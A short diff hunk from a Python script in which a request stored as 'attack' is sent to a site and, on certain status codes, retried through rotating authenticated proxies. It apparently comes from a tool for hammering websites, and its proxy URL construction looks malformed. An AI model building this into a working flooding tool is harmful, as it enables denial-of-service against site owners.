@@ -83,7 +83,7 @@ def mainth():
             site = "https://" + site
         try:
             attack = scraper.get(site)
-            if attack.status_code >= 302 and attack.status_code >= 200:
+            if attack.status_code >= 302:
                 for proxy in data['proxy']:
                     scraper.proxies.update(
                         {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
